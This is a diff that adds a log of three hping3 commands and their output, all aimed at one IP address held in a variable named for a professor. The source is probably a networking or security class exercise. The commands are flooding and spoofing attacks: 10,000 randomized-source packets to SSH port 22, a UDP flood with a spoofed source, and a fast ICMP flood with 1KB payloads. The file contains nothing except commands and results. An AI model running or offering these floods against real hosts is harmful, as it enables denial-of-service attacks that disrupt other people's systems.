@@ -1,0 +1,59 @@
+1. hping3 $profIP -c 10000 -p 22 --rand-source
+Output: HPING 138.197.149.203 (eth0 138.197.149.203): NO FLAGS are set, 40 headers + 0 data bytes
+--- 138.197.149.203 hping statistic ---
+1106 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+
+2. hping3 $profIP -c 9000 -i --faster --udp --spoof 172.16.0.6
+Output: --- 138.197.149.203 hping statistic ---
+1 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+
+3. hping3 $profIP -c 11000 -i u750 -1 --data 1KB
+Output:
+len=46 ip=138.197.149.203 ttl=62 id=63632 icmp_seq=10962 rtt=4.2 ms
+len=46 ip=138.197.149.203 ttl=62 id=63633 icmp_seq=10963 rtt=3.5 ms
+len=46 ip=138.197.149.203 ttl=62 id=63634 icmp_seq=10964 rtt=2.7 ms
+len=46 ip=138.197.149.203 ttl=62 id=63635 icmp_seq=10965 rtt=7.7 ms
+len=46 ip=138.197.149.203 ttl=62 id=63636 icmp_seq=10966 rtt=6.9 ms
+len=46 ip=138.197.149.203 ttl=62 id=63637 icmp_seq=10967 rtt=6.2 ms
+len=46 ip=138.197.149.203 ttl=62 id=63638 icmp_seq=10968 rtt=5.5 ms
+len=46 ip=138.197.149.203 ttl=62 id=63639 icmp_seq=10969 rtt=4.9 ms
+len=46 ip=138.197.149.203 ttl=62 id=63640 icmp_seq=10970 rtt=4.2 ms
+len=46 ip=138.197.149.203 ttl=62 id=63641 icmp_seq=10971 rtt=3.4 ms
+len=46 ip=138.197.149.203 ttl=62 id=63642 icmp_seq=10972 rtt=2.6 ms
+len=46 ip=138.197.149.203 ttl=62 id=63643 icmp_seq=10973 rtt=8.3 ms
+len=46 ip=138.197.149.203 ttl=62 id=63644 icmp_seq=10974 rtt=7.6 ms
+len=46 ip=138.197.149.203 ttl=62 id=63645 icmp_seq=10975 rtt=7.1 ms
+len=46 ip=138.197.149.203 ttl=62 id=63646 icmp_seq=10976 rtt=6.4 ms
+len=46 ip=138.197.149.203 ttl=62 id=63647 icmp_seq=10977 rtt=5.7 ms
+len=46 ip=138.197.149.203 ttl=62 id=63648 icmp_seq=10978 rtt=5.0 ms
+len=46 ip=138.197.149.203 ttl=62 id=63649 icmp_seq=10979 rtt=4.3 ms
+len=46 ip=138.197.149.203 ttl=62 id=63650 icmp_seq=10980 rtt=3.7 ms
+len=46 ip=138.197.149.203 ttl=62 id=63651 icmp_seq=10981 rtt=2.9 ms
+len=46 ip=138.197.149.203 ttl=62 id=63652 icmp_seq=10982 rtt=2.0 ms
+len=46 ip=138.197.149.203 ttl=62 id=63653 icmp_seq=10983 rtt=7.5 ms
+len=46 ip=138.197.149.203 ttl=62 id=63654 icmp_seq=10984 rtt=6.8 ms
+len=46 ip=138.197.149.203 ttl=62 id=63655 icmp_seq=10985 rtt=6.3 ms
+len=46 ip=138.197.149.203 ttl=62 id=63656 icmp_seq=10986 rtt=5.5 ms
+len=46 ip=138.197.149.203 ttl=62 id=63657 icmp_seq=10987 rtt=4.9 ms
+len=46 ip=138.197.149.203 ttl=62 id=63658 icmp_seq=10988 rtt=4.3 ms
+len=46 ip=138.197.149.203 ttl=62 id=63659 icmp_seq=10989 rtt=3.8 ms
+len=46 ip=138.197.149.203 ttl=62 id=63660 icmp_seq=10990 rtt=3.0 ms
+len=46 ip=138.197.149.203 ttl=62 id=63661 icmp_seq=10991 rtt=2.2 ms
+len=46 ip=138.197.149.203 ttl=62 id=63662 icmp_seq=10992 rtt=7.5 ms
+len=46 ip=138.197.149.203 ttl=62 id=63663 icmp_seq=10993 rtt=6.9 ms
+len=46 ip=138.197.149.203 ttl=62 id=63664 icmp_seq=10994 rtt=6.2 ms
+len=46 ip=138.197.149.203 ttl=62 id=63665 icmp_seq=10995 rtt=5.5 ms
+len=46 ip=138.197.149.203 ttl=62 id=63666 icmp_seq=10996 rtt=4.8 ms
+len=46 ip=138.197.149.203 ttl=62 id=63667 icmp_seq=10997 rtt=4.1 ms
+len=46 ip=138.197.149.203 ttl=62 id=63668 icmp_seq=10998 rtt=3.4 ms
+len=46 ip=138.197.149.203 ttl=62 id=63669 icmp_seq=10999 rtt=2.5 ms
+
+--- 138.197.149.203 hping statistic ---
+11000 packets transmitted, 11000 packets received, 0% packet loss
+round-trip min/avg/max = 0.8/7.8/1008.3 ms
+
+
